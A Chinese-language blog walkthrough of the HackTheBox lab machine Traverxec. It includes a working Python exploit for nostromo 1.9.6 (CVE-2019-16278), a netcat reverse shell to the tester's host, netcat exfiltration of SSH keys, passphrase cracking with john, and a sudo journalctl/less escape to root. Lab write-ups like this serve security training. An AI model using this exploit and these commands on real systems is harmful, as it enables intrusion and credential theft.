<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-12-31</span></span><br><span class="line"><span class="comment"># Exploit Author: Kr0ff</span></span><br><span class="line"><span class="comment"># Vendor Homepage:</span></span><br><span class="line"><span class="comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.9.6</span></span><br><span class="line"><span class="comment"># Tested on: Debian</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16278</span></span><br><span class="line"></span><br><span class="line">cve2019_16278.py</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">art = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                        _____-2019-16278</span></span><br><span class="line"><span class="string">        _____  _______    ______   _____\    \   </span></span><br><span class="line"><span class="string">   _____\    \_\      |  |      | /    / |    |  </span></span><br><span class="line"><span class="string">  /     /|     ||     /  /     /|/    /  /___/|  </span></span><br><span class="line"><span class="string"> /     / /____/||\    \  \    |/|    |__ |___|/  </span></span><br><span class="line"><span class="string">|     | |____|/ \ \    \ |    | |       \        </span></span><br><span class="line"><span class="string">|     |  _____   \|     \|    | |     __/ __     </span></span><br><span class="line"><span class="string">|\     \|\    \   |\         /| |\    \  /  \    </span></span><br><span class="line"><span class="string">| \_____\|    |   | \_______/ | | \____\/    |   </span></span><br><span class="line"><span class="string">| |     /____/|    \ |     | /  | |    |____/|   </span></span><br><span class="line"><span class="string"> \|_____|    ||     \|_____|/    \|____|   | |   </span></span><br><span class="line"><span class="string">        |____|/                        |___|/    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">help_menu = <span class="string">&#x27;\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">def connect(soc):</span><br><span class="line">    response = <span class="string">&quot;&quot;</span></span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            connection = soc.recv(1024)</span><br><span class="line">            <span class="keyword">if</span> len(connection) == 0:</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            response += connection</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    <span class="built_in">return</span> response</span><br><span class="line"></span><br><span class="line">def cve(target, port, cmd):</span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, int(port)))</span><br><span class="line">    payload = <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#x27;</span>.format(cmd)</span><br><span class="line">    soc.send(payload)</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    <span class="built_in">print</span>(receive)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        target = sys.argv[1]</span><br><span class="line">        port = sys.argv[2]</span><br><span class="line">        cmd = sys.argv[3]</span><br><span class="line"></span><br><span class="line">        cve(target, port, cmd)</span><br><span class="line">   </span><br><span class="line">    except IndexError:</span><br><span class="line">        <span class="built_in">print</span>(help_menu)</span><br></pre></td></tr></table></figure>

<p>然后利用脚本执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\hack the box靶机渗透\Traverxec&gt;python exploit.py 10.10.10.165 80 id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-2019-16278</span><br><span class="line">        _____  _______    ______   _____\    \</span><br><span class="line">   _____\    \_\      |  |      | /    / |    |</span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|</span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/</span><br><span class="line">|     | |____|/ \ \    \ |    | |       \</span><br><span class="line">|     |  _____   \|     \|    | |     __/ __</span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \</span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |</span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|</span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |</span><br><span class="line">        |____|/                        |___|/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 22 Apr 2020 02:12:04 GMT</span><br><span class="line">Server: nostromo 1.9.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>为了得到一个反向shell，可以使用Netcat。运行脚本，并在本地机器上启动一个Netcat侦听器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec<span class="comment"># python exploit.py 10.10.10.165 80 &quot;nc -c /bin/sh 10.10.15.136 5566&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____-2019-16278</span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/ </span><br></pre></td></tr></table></figure>

<p>成功的收到了反弹回来的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">10.10.10.165: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.15.136] from (UNKNOWN) [10.10.10.165] 47074</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@traverxec:/usr/bin$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@traverxec:/usr/bin$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h3 id="还可以使用metasploit"><a href="#还可以使用metasploit" class="headerlink" title="还可以使用metasploit"></a>还可以使用metasploit</h3><p>还可以使用Metasploit模块来利用这个漏洞。开始Metasploit并尝试利用它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/http/nostromo_code_exec</span><br><span class="line">msf &gt; <span class="built_in">set</span> rhosts 10.10.10.165</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.15.136</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>

<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>枚举系统来查找提权向量。/etc/passwd文件显示一个名为david的用户。</p>
<p>它还显示Nostromo web根目录是/var/nostromo/。</p>
<p>文件夹/var/nostromo/conf包含web服务器配置文件。</p>
<p>文件nhttpd.conf和.htpasswd看起来很有趣。</p>
<p>.htpasswd包含一个密码散列，这个散列是可破解的，但是它没有任何用处。<br>conf文件包含以下配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@traverxec:/var/nostromo/conf$ ls</span><br><span class="line">ls</span><br><span class="line">mimes  nhttpd.conf</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf</span><br><span class="line">cat nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line"></span><br><span class="line">servername              traverxec.htb</span><br><span class="line">serverlisten            *</span><br><span class="line">serveradmin             david@traverxec.htb</span><br><span class="line">serverroot              /var/nostromo</span><br><span class="line">servermimes             conf/mimes</span><br><span class="line">docroot                 /var/nostromo/htdocs</span><br><span class="line">docindex                index.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">logpid                  logs/nhttpd.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line"></span><br><span class="line">user                    www-data</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">htaccess                .htaccess</span><br><span class="line">htpasswd                /var/nostromo/conf/.htpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">/icons                  /var/nostromo/icons</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs                /home</span><br><span class="line">homedirs_public         public_www</span><br></pre></td></tr></table></figure>

<p>HOMEDIRS部分确定用户的主目录中可能有一个public_www文件夹。</p>
<p>用户的主目录不可读，但是发现public_www是可访问的。</p>
<p>该文件夹包含protected-file-area子文件夹。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@traverxec:/var/nostromo/conf$ <span class="built_in">cd</span> /home/david/public_www/protected-file-area</span><br><span class="line">&lt;conf$ <span class="built_in">cd</span> /home/david/public_www/protected-file-area</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ ls</span><br><span class="line">ls</span><br><span class="line">backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure>

<p>文件夹的枚举显示一些备份的SSH密钥。用netcat把它们转移到本地box里。在本地运行以下命令以接收文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec<span class="comment"># nc -lvp 1234 &gt; backup.tgz</span></span><br><span class="line">listening on [any] 1234 ...</span><br></pre></td></tr></table></figure>

<p>接下来，在服务器上运行以下命令来完成传输。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.15.136 1234 &lt; backup-ssh-identity-files.tgz</span><br><span class="line">&lt;c 10.10.15.136 1234 &lt; backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure>

<p>kali端成功收到了文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec<span class="comment"># ls -la</span></span><br><span class="line">总用量 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 4月  21 22:58 .</span><br><span class="line">drwxrwxrwx 21 root root 4096 4月  21 22:32 ..</span><br><span class="line">-rw-r--r--  1 root root 1915 4月  21 23:01 backup.tgz</span><br><span class="line">-rw-r--r--  1 root root 1503 4月  21 22:33 exploit.py</span><br></pre></td></tr></table></figure>

<p>提取backup.tgz中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec<span class="comment"># tar -xvf backup.tgz </span></span><br><span class="line">home/david/.ssh/</span><br><span class="line">home/david/.ssh/authorized_keys</span><br><span class="line">home/david/.ssh/id_rsa</span><br><span class="line">home/david/.ssh/id_rsa.pub</span><br><span class="line">root@kali:~/vulnhub/Traverxec<span class="comment"># ls</span></span><br><span class="line">backup.tgz  exploit.py  home</span><br></pre></td></tr></table></figure>

<p>发现归档文件包含SSH密钥，其中可以使用私有密钥id_rsa作为david用户登录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># ssh -i id_rsa david@10.10.10.165</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.165 (10.10.10.165)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.165<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>id_rsa<span class="string">&#x27;:</span></span><br></pre></td></tr></table></figure>

<p>但是，私钥是加密的，需要密码。用john来试着破解它。首先，使用ssh2john从RSA密钥中提取散列。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt</span></span><br><span class="line">/usr/share/john/ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated <span class="built_in">alias</span> since Python 3.1, use decodebytes()</span><br><span class="line">  data = base64.decodestring(data)</span><br><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  hash.txt  id_rsa  id_rsa.pub</span><br><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># cat hash.txt </span></span><br><span class="line">id_rsa:<span class="variable">$sshng</span><span class="variable">$1</span><span class="variable">$16</span><span class="variable">$477EEFFBA56F9D283D349033D5D08C4F</span><span class="variable">$1200</span><span class="variable">$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0</span></span><br></pre></td></tr></table></figure>

<p>接下来，使用john和rockyou.txt字典破解它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">hunter           (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:09 DONE (2020-04-21 23:13) 0.1097g/s 1574Kp/s 1574Kc/s 1574KC/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>显示hunter为密码，使用它来SSH的连接到box。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/Traverxec/home/david/.ssh<span class="comment"># ssh -i id_rsa david@10.10.10.165</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">Last login: Tue Apr 21 19:57:32 2020 from 10.10.15.14</span><br><span class="line">david@traverxec:~$ id</span><br><span class="line">uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">david@traverxec:~$ whoami</span><br><span class="line">david</span><br><span class="line">david@traverxec:~$ ls</span><br><span class="line">bin  public_www  user.txt</span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7db0b48469606a42cec20750d9782f3d</span><br></pre></td></tr></table></figure>

<p>成功登录并找到了user.txt，然后提交</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb25.jpg"></li>
</ul>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>用户的主目录包含一个名为bin的文件夹，其中包含以下内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@traverxec:~$ <span class="built_in">cd</span> bin</span><br><span class="line">david@traverxec:~/bin$ ls</span><br><span class="line">server-stats.head  server-stats.sh</span><br><span class="line">david@traverxec:~/bin$ cat server-stats.head</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |&#x27;-.....-&#x27;| |::::|</span></span><br><span class="line"><span class="string">                                                              &#x27;&quot;</span><span class="string">&quot;)---(&quot;</span><span class="string">&quot;&#x27; |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\&quot;    &quot;</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span> </span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Load: `/usr/bin/uptime`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Last 5 journal log lines:&quot;</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br></pre></td></tr></table></figure>

<p>最后一行很有趣，因为它使用sudo执行journalctl。运行脚本来查看输出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@traverxec:~/bin$ ./server-stats.sh </span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |&#x27;-.....-&#x27;| |::::|</span></span><br><span class="line"><span class="string">                                                              &#x27;&quot;</span><span class="string">&quot;)---(&quot;</span><span class="string">&quot;&#x27; |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\&quot;    &quot;</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span> </span><br><span class="line"></span><br><span class="line">Load:  23:31:53 up 18:20,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line"> </span><br><span class="line">Open nhttpd sockets: 4</span><br><span class="line">Files <span class="keyword">in</span> the docroot: 117</span><br><span class="line"> </span><br><span class="line">Last 5 journal <span class="built_in">log</span> lines:</span><br><span class="line">-- Logs begin at Tue 2020-04-21 05:11:04 EDT, end at Tue 2020-04-21 23:31:53 EDT. --</span><br><span class="line">Apr 21 18:32:26 traverxec crontab[10493]: (www-data) LIST (www-data)</span><br><span class="line">Apr 21 18:32:26 traverxec sudo[10666]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data</span><br><span class="line">Apr 21 18:32:28 traverxec sudo[10666]: pam_unix(sudo:auth): conversation failed</span><br><span class="line">Apr 21 18:32:28 traverxec sudo[10666]: pam_unix(sudo:auth): auth could not identify password <span class="keyword">for</span> [www-data]</span><br><span class="line">Apr 21 18:32:28 traverxec sudo[10666]: www-data : <span class="built_in">command</span> not allowed ; TTY=pts/7 ; PWD=/usr/bin ; USER=root ; COMMAND=list</span><br></pre></td></tr></table></figure>

<p>该脚本使用journalctl返回nostromo服务日志的最后5行。</p>
<p>这是可以利用的，因为journalctl调用默认的分页器，而默认的分页器可能更少。</p>
<p>less命令将输出显示在用户的屏幕上，并在显示内容后等待用户输入。</p>
<p>可以通过运行shell命令来利用这一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure>

<p>上面的命令调用less，之后可以通过前缀运行shell命令!。尝试执行/bin/bash。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<p>成功的提升到root权限并得到了root.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Wed 2020-04-22 00:21:56 EDT, end at Wed 2020-04-22 02:03:27 EDT. --</span><br><span class="line">Apr 22 01:16:05 traverxec sudo[794]: www-data : user NOT <span class="keyword">in</span> sudoers ; TTY=pts/1 ; PWD=/etc ; USER=root ; COMMAND=/bin/bash</span><br><span class="line">Apr 22 01:58:13 traverxec su[856]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rh</span><br><span class="line">Apr 22 01:58:15 traverxec su[856]: FAILED SU (to root) www-data on none</span><br><span class="line">Apr 22 01:58:28 traverxec su[860]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rh</span><br><span class="line">Apr 22 01:58:31 traverxec su[860]: FAILED SU (to root) www-data on none</span><br><span class="line">!/bin/bash</span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># cd /root</span></span><br><span class="line">root@traverxec:~<span class="comment"># ls</span></span><br><span class="line">nostromo_1.9.6-1.deb  root.txt</span><br><span class="line">root@traverxec:~<span class="comment"># cat root.txt</span></span><br><span class="line">9aa36a6d76f785dfd320a478f6e0d906</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb26.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb27.jpg"></p>
</li>
</ul>
<p><font color="red">知识点总结：</font></p>
<ul>
<li>nostromo版本1.9.6远程代码执行漏洞</li>
<li>nc -c /bin/sh 10.10.15.136 4444 命令反弹shell</li>
<li>Metasploit exploit/multi/http/nostromo_code_exec模块反弹shell</li>
<li>nc 10.10.15.136 1234 &lt; backup-ssh-identity-files.tgz命令传输文件，并用nc -lvp 1234 &gt; backup.tgz命令接收文件</li>
<li>ssh2john从RSA密钥中提取hash散列</li>
<li>john和rockyou.txt字典破解提取的hash值</li>
<li>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service命令调用less之后通过前缀运行shell命令!，成功执行/bin/bash从而提权到root。</li>
</ul>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[View2aKill]</title>
    <url>/2020/01/20/View2aKill/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：View2aKill：1<br>发布日期：2019年10月29日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTWkyckUwdWZmcTdNUFN2ZTNfdHJuVXR4bG40SGdLeV8vdmlldw==">https://drive.google.com/file/d/1Mi2rE0uffq7MPSve3_trnUtxln4HgKy_/view<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92aWV3MmFraWxsL1ZpZXcyYUtpbGwub3Zh">https://download.vulnhub.com/view2akill/View2aKill.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS92aWV3MmFraWxsL1ZpZXcyYUtpbGwub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/view2akill/View2aKill.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>使命：百万富翁的精神病学家Max Zorin是破坏硅谷计划的幕后策划者，该计划旨在夺取国际微芯片市场的控制权。root并阻止这个疯子实现目标！</p>
<ul>
<li>难度：中级</li>
<li>flag是/root/flag/flag.sh</li>
<li>在VMware中使用。启用DHCP。</li>
